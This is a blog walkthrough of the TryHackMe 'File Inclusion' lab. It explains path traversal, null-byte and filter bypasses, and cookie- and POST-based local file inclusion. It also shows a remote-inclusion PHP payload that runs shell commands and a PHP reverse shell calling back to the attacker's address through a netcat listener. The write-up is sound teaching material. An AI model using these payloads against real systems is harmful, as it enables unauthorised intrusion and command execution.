+++
date = '2025-09-26T07:58:35+02:00'
title = 'File Inclusion'
summary = "A _complete_ walkthrough of the TryHackMe room \"File Inclusion\""
description = "Step-by-step explanations of the \"File Inclusion\" vulnerability"
author = ["Ole", "https://github.com/OleMussmann"]
issueLink = "https://github.com/OleMussmann/ole.mn/issues"
tags = ["cybersecurity", "walkthrough"]
draft = true

toc = true
autonumber = false
readTime = true
math = false
showTags = true
hideBackToTop = false
hidePagination = true
fediverse = "@ole@fosstodon.org"

[sitemap]
disable = false
+++

![Sneaky fingers fishing files out of folders](file_inclusion.jpg#eager "If you did not want me to access these files, you should have protected them better 🥷")


[tryhackme.com](https://tryhackme.com) is a wonderful site that teaches cybersecurity. Each topic is presented in "rooms", which are a series of reading material and hands-on exercises. More often than not, all information to solve the exercises is provided. In the room ["File Inclusion"](https://tryhackme.com/room/fileinc), however, it is not. Luckily there are many helpful people on the internet providing walkthroughs of TryHackMe's rooms, yay! What do those look like? Some just write out the answers [^answers], some others also show the necessary steps how they solved the exercises. With both I miss is an explanation _why_ things work. A quote:

> "Sometimes it's better to use tool X instead of Y."
>
> -- a "helpful" internet person

[^answers]: You are bragging that you solved it. Congrats. You are not helping me learn, though.

**\<rant>** This room is about HTTP requests. The server on the other side does not care which tool you use, it only receives the raw request that you send. If you need to use a different tool for your solution, you did not fully understand what went wrong with the first one. **\</rant>**

So this here is not the first walkthrough of the "File Inclusion" room. Nor the second, nor the tenth. But it is the one that will help you understand it from A to Z. I'm skipping most answers here, because if you work along with me, you will get them yourself for an extra pat on the back.

## Task 1: Introduction

Let's remember what the most common parts of a Uniform Resource Locator (URL) are. Not all parts are used in every request, so in practice your URL is often much less complicated than the one below.

### URL Syntax

```
protocol/scheme       path  file name     query        fragment
╭─┴─╮                   ╭┴╮ ╭──┴──╮ ╭───────┴─────────╮ ╭──┴──╮
https://example.com:443/job/get.php?user=bo&file=CV.pdf#uploads
        ╰────┬────╯ ╰┬╯            |                   |
           host    port  ?: query separator  #: fragment separator
```

- The `protocol` or `scheme` tells us what kind of request this URL represents and therefore which program should be used to handle it. A `mailto:` scheme could be opened with an E-Mail program; a `https:` scheme would be opened in a browser.
- The `host` identifies the server that receives the request. This is often its `domain name` (like a "street address"). That one will need to be translated into the `IP address` of the server (like "GPS coordinates") via the Domain Name System (DNS), but this is out of the scope of this room. This translation can be omitted and the `IP address` can be used for the host directly.
- An optional `port` tells us which service on the receiving server should handle the request. There are many standard ports, like port `443` for `https` web requests. If we omitted the port here, the browser would have chosen the correct one for us.
- The `path` and `file name` tells us which file to request. You can see the path as (optionally nested) folders, separated by a slash `/`. In our case the file `get.php` would contain instructions that would prepare the appropriate answer to our request. Both can be omitted if the server has a "default" answer to a request.
- An optional query string follows the `path` and `file name` after a question mark `?`. This string contains parameters that are handed over to `get.php`.
- Lastly, the optional `fragment` identifier -- separated from the rest by a hash mark `#` -- is ignored by the server. It is usually used on the client-side, e.g. your browser, to scroll down to a section named "fragment" when you open that link in the browser.

And zooming into the `query` string...

```
attribute/value pairs
╭──┴──╮ ╭────┴────╮
user=bo&file=CV.pdf
       |
 &: query delimiter
```
...we find attribute/value (sometimes named parameter/value) pairs. The attributes and values are separatey by an equal sign `=`, and multiple pairs themselves are separated by (usually) an ampersand `&`.

These attribute/value pairs are parameters that are fed to the code contained in the file `get.php`.

### Where's the Danger?

Via the URL a user gains access to certain resources that are stored on the server. If a web application is not built well, a user could request resources that are not meant for them, e.g. the password file of the server's users. That would be unfortunate, no?


## Task 2: Deploy the VM

As usual, the target machine is not publicly accessible. We need to hook into the TryHackMe network first via a Virtual Private Network (VPN). Follow [their instructions](https://tryhackme.com/access) for this. While TryHackMe wants you to use their supplied AttackBox, I would recommend you to build your own arsenal of tools, be it on your local computer or a Virtual Machine (VM) that you can take with you. You will learn more, and your toolbox is now more portable. After setting up the VPN connection, click the big green button **Start Machine**.


## Task 3: Path Traversal

Behold, a possible file structure of a web server:

```
/  ← Server root
├── /etc
│     ╰── /passwd  ← Juicy system file ✨
╰── /var
      ╰── /www
            ╰── /app  ← This is the "home" of the web server 🏠
                  ╰── /CVs
                        ╰── /CV.pdf  ← A file a user might request 📄
```
The web server files live in the folder `/var/www/app`. The server's super-duper-secret password file is stored, presumably off limits, in the file `/etc/passwd`.

### An Excursion to the Command Line

Let's imagine we are the system administrator, and we like to interact with the web server from the command line. Our command line prompt looks as follows.

`USER@HOSTNAME:/THE/FOLDER/WE/ARE/CURRENTLY/IN $`

After the dollar sign `$` we can type our commands and press enter.

We can change directories with the `cd` (`c`ange `d`irectory) command, followed by a folder path. One special folder name is the double-dot `..`, which denotes the _parent_ directory. See how we can traverse the tree of folders on our system.

```
admin@web_server:/ $ cd var
admin@web_server:/var $ cd www/app
admin@web_server:/var/www/app $ cd ..
admin@web_server:/var/www $ cd ../..
admin@web_server:/ $
```

### Path Traversal

The web server files live in `/var/www/app`. What if, instead of the file `CVs/CV.pdf`, a user would request the file `../../../etc/passwd` ...? 😱

### Exercise: 3

This is an easy search in your browser.

## Task 4: Local File Inclusion -- LFI

In **Lab 1** we work with the file `lab1.php`. Recalling the [URL Syntax](#url-syntax) from above, we have the parameter/value pairs that are fed to `lab1.php`. If a user wants to download a CV, the URL would look like this.

```
http://IP_ADDRESS/lab1.php?file=CVs/CV.pdf
```

### Exercise: 4

These can be solved without interacting with the server, but it's instructive to actually try them out.

#### Answer 1

Click on **Lab 1**. As instructed, request the file `/etc/passwd`.

In the actual query -- and probably also in the URL in your browser address bar -- the query is _encoded_.

> A tangent about URL encoding.
>
> We are trying to shove a string containing slashes `/` into a value of an attribute/value pair. The value does look suspiciously like a path. Well, it actually is! To not confuse the server, the browser "escapes" those characters. It _encodes_ these slashes as something else, a `/` turns into `%2F`. See the [ASCII Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.asp) for a full list of possible translations. The reverse process is called _decoding_.

TryHackMe wants to see the answer _decoded_ (`%2F` turned back into slashes `/`). Furthermore, for the exercise field, we need to omit the `scheme` and `host`. The answer would be written as:

```
/lab1.php?file=/REPLACE/WITH/YOUR/DECODED/URL
```

#### Answer 2

Click on **Lab 2**. Enter a random string into the text field, press enter, and read the error message. Which directory is prepended to your entered string?

## Task 5: Local File Inclusion -- LFI Continued

In the exercise above there were no safeguards protecting sensitive system files. This is akin to leaving your front door unlocked, key inserted, and neon signs pointing to your front door, spelling in friendly letters "Please Burgle".

For this task, there are _some_ filters in place that try to prevent unauthorized access to sensitive files. Let's see if they can deter you.

To give some feedback of what's happening behind the curtain, we are supplied with helpful error messages. From these you can see what the request looks like _after_ the safety filters are applied.

When we enter "THM" into the text field, we request `http://IP_ADDRESS/lab3.php?file=THM`, and we see the following error message:

```
Warning: include(includes/THM.php) [function.include]:
failed to open stream:
No such file or directory in /var/www/html/lab3.php on line 26
```

Condensed, we see that `THM` is translated to `includes/THM.php`.

Let's try Path Traversal. Enter `../../THM` into the field. The request is translated to `includes/../../THM.php`. Good! We can navigate the folder tree on the server this way. Of notice is that the file ending `.php` is automatically appended to the translated string. This is an issue, since we want to read the file `/etc/passwd`, and not `/etc/passwd.php`. Null Byte to the rescue!

### Null Byte

What's a Null Byte? Here you go: `\0`, or `%00`, depending on the encoding. It's a special set of characters that denote the end of a string in programming languages like C, or old versions of PHP. It's easier to understand with a demonstration.

Check out the online C compiler at https://www.programiz.com/c-programming/online-compiler/, paste the code below and pres **Run**, or follow along on your own system if you are familiar with compiling C code.

```c
#include <stdio.h>
int main() {
    printf("text with\0 null byte");
    return 0;
}
```

Here's the output:

```
text with
```

Once the C compiler encounters `\0`, it takes it as a sign that the string is finished. We can use that to our advantage in this exercise. Remember the `.php` that was appended automatically? Let's snip that one off, then. Enter into the text field `THM%00` and press enter. *Presto!* It does not work. What happens here? Special characters from the text field are _encoded_, the percentage sign `%` is turned into `%25`, as we now can observe in the browser's address bar. To find our way around that, enter `THM%00` directly into the address bar, like so:

```
http://IP_ADDRESS/lab3.php?file=THM%00
```

Behold, the `.php` ending is vanquished.

#### Null Byte Caveats

As magical as this sounds, most modern programming languages and frameworks are immune to this[^immune]. In PHP, which is what the THM room is using, it was [fixed in 2010](https://www.php.net/ChangeLog-5.php#5.3.4). The vulnerability was discovered four years earlier, labelled with [CVE-2006-7243](https://nvd.nist.gov/vuln/detail/CVE-2006-7243). In C, as seen above, it still works, and selected legacy systems might be vulnerable as well. Just don't get your hopes up to use this on a regular basis in the wild.

[^immune]: Annoying for pentesters, but the web is a much safer space this way.

### Circumventing Filters

An engineer trying to prevent [Path Traversal](#path-traversal), could try to remove all `../` that they encounter. That would surely solve it, no? Let's let this filter loose on a string like this:

```
text to be removed
  ╭┴╮   ╭┴╮   ╭┴╮
....//....//....//etc/passwd
```

... and we get:

```
../../etc/passwd
```

... which looks, "coincidentally", like Path Traversal. You just sneaked around this filter.

### Exercise: 5

We now apply many things we have just learned.

#### Question: 1
Remember that strings in the text field might be escaped. Use the browser's address bar to circumvent that. BurpSuite and other tools would work as well, of course.

#### Question: 2
Read text from THM's "Task 3" again, if you forgot.

> You don't need it to answer the questions, but if you want to crack Lab #4, use the same approach as in [Question 1](#question-1). For a shot at Lab #5, look at [Circumventing Filters](#circumventing-filters).

#### Question: 3

Let's open Lab #6. Looking at the info text in the text field is sufficient to answer this.

#### Question: 4

Apparently we have to use the folder mentioned in [Question: 3](#question-3). Let's start the [Path Traversal](#path-traversal) from there. Make sure you look at `/etc/os-release` instead of `/etc/passwd` as we did before.

## Task 6: Remote File Inclusion -- RFI

Wouldn't it be so much better if, instead of just browsing the file-system of the target machine, we could execute commands on it? We could launch `find` commands to search for juicy data files instead of poking in the dark. We could even check if we can find other, connected machines to this one. Oh, the POWERRR!

Enter: Remote File Inclusion (RFI).

> Again, some caveats. This only works if the webserver is allowed to check URLs instead of paths for files to use. Usually this setting (`allow_url_fopen` for PHP) would be switched "off". And even if this setting is "on", the URLs or retrieved payloads might be properly checked before they are executed. A successful RFI would require the target machine to be severely misconfigured.

So, let's do this. The steps involved for RFI are as follows:

1. Request a file as we have done before, but this time it points to an externally hosted payload file.
1. The target server will then fetch the file from our machine.
1. The content of our payload file will be injected into PHP's `include` function and executed.
1. The results are displayed within the web page that we opened.

So how do we get our "externally hosted payload file"? Do we need to host it somewhere? Luckily not. Let's break down the above list into actionable steps.

1. Write a payload file. We start with a classic "hello world", to see if RFI works in the first place.
   ```php
   // payload_hello.php
   <?PHP echo "Hello THM"; ?>
   ```
1. Open your system's firewall on a port of your choosing, if needed. It is recommended to stick to commonly used ports like `43`, `80`, `8080`, `443`, `139`, or `445` to avoid suspicion. For the sake of this example, let's stick to `8080`.
1. We are in the same network as the target machine, courtesy to the VPN connection we established. This means our attacker machine is reachable by the target machine. In the folder of your `payload_hello.php` file, run a simple web server. Replace the port number if you chose a different one.
   ```bash
   $ python3 -m http.server 8080
   ```
1. Find out IPv4 address in the THM VPN network of your attacker machine with the `ip a` command. It's probably somewhere at the bottom of the list. Mine, for example, is named `tun0`.
   ```bash
   $ ip a
   [...]
   10: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet YOUR_IPv4_ADDRESS/16 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 YOUR_IPv6_ADDRESS/64 scope link stable-privacy proto kernel_ll
       valid_lft forever preferred_lft forever
   ```
1. In the playground, request the remote payload file.
   ```
   http://YOUR_IPv4_ADDRESS:8080/payload_hello.php
   ```

If you now read "Hello THM" in the browser, then congratulations! You have successfully executed a Remote File Inclusion attack.

### Remote Code Execution -- RCE
Printing a message is fine and dandy, but we want to interact with the target system. For that, we need to be able to remotely execute commands, we want Remote Code Execution (RCE). Let's upgrade our payload file.

```php
// payload_commands.php
<?PHP
  $output = shell_exec('ls -a');
  echo $output;
?>
```

Once we request _this_ payload file, we see in our browser a list of all files and folders in the root of the web server.
```
. .. .htaccess THM-profile css img includes index.php js [...]
```

You are now equipped to finish the last task from [Task 8](#task-8-challenge), which relies on RCE. Yay!

### RCE ➜ Shell
Let's do even better. We can now, ideally, execute one or more commands that we included in the payload. Would it not be even nicer if we had a shell on the target machine?

Commence the last payload upgrade, including a Reverse Shell. There are plenty of great resources for all kinds of reverse shells. Here we pick the [PHP Reverse Shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php) from [SwisskyRepo's Internal Pentest Cheatsheets](https://swisskyrepo.github.io/InternalAllTheThings/).

Port `8080` is already in use to serve our payload file. We need yet a different one for our Reverse Shell. Let's pick for this example port `445`. Don't forget to open your firewall for this one as well, if necessary. Replace the port if you used a different one.

```php
// payload_shell.php
<?PHP
  $sock=fsockopen("YOUR_IPv4_ADDRESS",445);
  $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

Before we request our ultimate Reverse Shell payload, we need a listener on our side. We can use `netcat` (`nc`) for this. Replace the port if... well, by now you know the drill. Execute this on your own machine and request the new payload.

```bash
$ nc -lvnp 445
```

Once we request the new payload, we don't see any change on the website. Indeed, we did not print any output in the payload script. The terminal running `netcat`, however, now prints:

```bash
Connection from TARGET_IP_ADDRESS:RANDOM_PORT
/bin/sh: 0: can't access tty; job control turned off
$ ▇
```

Voilà, we have shell access. The system is ours, OURS! Well, at least with all the permissions that the `www-data` user has. If we want root permissions, then we need Privilege Escalation, but that's a topic for [another room](https://tryhackme.com/module/privilege-escalation). In any case, you can now execute commands right on the target machine. Well done!

## Task 7: Remediation

This is a nice summary of all the things that could have prevented us from gaining various kinds of access to the target system. Click through to the final section.

## Task 8: Challenge

And a challenge it is indeed. If you have more or less followed THM's recommended from-zero-to-hero happy-path, you will most likely not yet know enough to pass the questions. We will figure them out and understand them one by one.

### Question: 1

We are hunting for `/etc/flag1`, so let's try that in the input field. Clicking "Include" does not lead us anywere, the input form is broken. We do have a helpful info message, though.

```
The input form is broken! You need to send
`POST` request with `file` parameter!
```

Ok, sure. We can change the request type. There are many ways to achieve this, but one of the easiest is to have a look at the source code of the web page. Find the section that looks like this...

```html
<form action="#" method="GET">
    <!-- web form stuff -->
</form>
```

... and change `GET` to `POST`. Now click on "Include" again. Yay, we can read the flag! How do `GET` and `POST` requests differ? For demonstrational purposes, I will capture both a `GET` and a `POST` request in BurpSuite and look at them in the "Comparer".

```python
# GET request
GET /challenges/chall1.php HTTP/1.1
Host: IP_ADDRESS
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) [...]
Accept: text/html,application/xhtml+xml,[...]
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

N.B.: If the input form were _not_ broken, we would see the form parameters appended to the URL, e.g. `/challenges/chall1.php?file=/etc/flag1`.

```python
# POST request
POST /challenges/chall1.php HTTP/1.1
Host: 10.10.37.44
Content-Length: 19
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.37.44
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) [...]
Accept: text/html,application/xhtml+xml,[...]
Referer: http://10.10.37.44/challenges/chall1.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

file=%2Fetc%2Fflag1
```

Just eyeballing it, the `POST` request looks longer. To see the actual differences, let's `diff` those.

```diff
< GET /challenges/chall1.php HTTP/1.1
---
> POST /challenges/chall1.php HTTP/1.1
> Content-Length: 19
> Cache-Control: max-age=0
> Origin: http://IP_ADDRESS
> Content-Type: application/x-www-form-urlencoded
> Referer: http://IP_ADDRESS/challenges/chall1.php
> 
> file=%2Fetc%2Fflag1
```

The `POST` request sends much more stuff. No surprise, the method changed from `GET` to `POST`, but more importantly we have two crucial extra lines.

```
Content-Type: application/x-www-form-urlencoded

file=%2Fetc%2Fflag1
```

The form parameters `file=%2Fetc%2Fflag1` are now in the _body_ of the request (separated by a newline from the header), and a line starting with `Content-Type` tells us how the body content is formatted. If you would naïvely change `GET` ➜ `POST` and be done with it, your request would be malformed and you would not get the result you wanted.

Different tools might format the request correctly out-of-the-box. But knowing now what a correct `POST` request looks like, you can now create proper requests with _any_ tool.

### Question: 2

Another error message for us.

```
Refresh the page please!
```

Pecking at `F5`, we oblige. The message changes.

```
Welcome Guest!
Only admins can access this page!
```

How does the server know that we are a "Guest"? If you are now, like me, feeling a bit snacky then it's a good time to have a look at our cookie jar. Open the developer tools in your browser. You can usually summon them with `F12`. Check out the "Storage" tab. There's one cookie stored, and it looks like this.

| Name | Value | Domain | ... |
| ---- | ----- | ------ | --- |
| THM  | Guest | IP_ADDRESS |... |

The error message _really_ encourages us to put on our "Admin" hat, doesn't it? Let's change the Value from `Guest` to `Admin`.

| Name | Value | Domain | ... |
| ---- | ----- | ------ | --- |
| THM  | Admin | IP_ADDRESS |... |

Refresh the page.

```
Welcome Admin
```

Why, thank you. But even more importantly, we learn the following.

```
Warning: include(includes/Admin.php) [function.include]: [...]
```

Aha! The value of the cookie is used as a path. How can we exploit that? Our target is `/etc/flag2`, so let's try that.


| Name | Value | Domain | ... |
| ---- | ----- | ------ | --- |
| THM  | /etc/flag2 | IP_ADDRESS |... |

`F5`, and we get:

```
Welcome /etc/flag2

Warning: include(includes//etc/flag2.php) [function.include]: [...]
```

Ok, our absolute path is taken as-is, and the file ending `.php` is appended. With the help of [Path Traversal](#task-3-path-traversal) and [Null Bytes](#null-byte) you can finally capture `/etc/flag2`.

Yummy indeed.

### Question: 3

The hunt is on for `/etc/flag3`. Entering this into the text field gives us the following error message.

```
Warning: include(etcflag.php) [function.include]: [...]
```

What happened? All our precious slashes are gone. There seem to be some filters in place. How well are they implemented? Let's try this again as a `POST` request. Do you still remember how to do that? On top of that, we have to get rid of the `.php` file ending with a [Null Byte](#null-byte). This is what we get.

```
Warning: include(/etc/flag.php%00.php) [function.include]: [...]
```

Predicament, the Null Byte is not working. Previously we made sure it's transferred properly (unencoded), by putting it in the browser address bar. Now that we use a `POST` request, we can't do that anymore. The parameters are in the _body_ of the request.

It's time to hand-craft a fitting request.

You can follow along and do it in BurpSuite, or freestyle it in any other way you want: `curl`, `python` requests, etc. In BurpSuite, let's capture a `GET` request with the text `/etc/flag3`. Right click on the request and send it to the "Repeater". There we can manipulate it and send it again after editing. This is our captured original request.

```
GET /challenges/chall3.php?file=%2Fetc%2Fflag3 HTTP/1.1
Host: IP_ADDRESS
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) [...]
Accept: text/html,application/xhtml+xml,[...]
Referer: http://10.10.37.44/challenges/chall3.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

We change `GET` to `POST` and throw away the URL parameters.

```
GET /challenges/chall3.php HTTP/1.1
```

Put the query parameters in the body (separated by a newline) and make sure to include the correct `Content-Type`.

```
Content-Type: application/x-www-form-urlencoded

file=/etc/flag3%00
```

Fire away your artisanal, hand-crafted request. Is it working?

### Question: 4

If you were lazy and did not follow along [Task 6](#task-6-remote-file-inclusion----rfi) (not blaming you), then now is your time to get your hands dirty with Remote Code Execution in the playground.

## Wrap Up

Woah. That was a lot of content. I hope you learned a thing or two.

We have covered

- the anatomy of URLs,
- Path Traversal,
- Null Bytes,
- the difference between `GET` and `POST` requests,
- Local File Inclusion,
- Remote File Inclusion, and
- Remote Code Execution.

Congratulations for making it to the end and passing the [File Inclusion room](https://tryhackme.com/room/fileinc)! If you find anything you could improve in this walkthrough, please open an [issue](https://github.com/OleMussmann/ole.mn/issues/new?title=[2025-10-file_inclusion]%20YOUR%20FEEDBACK) on GitHub.
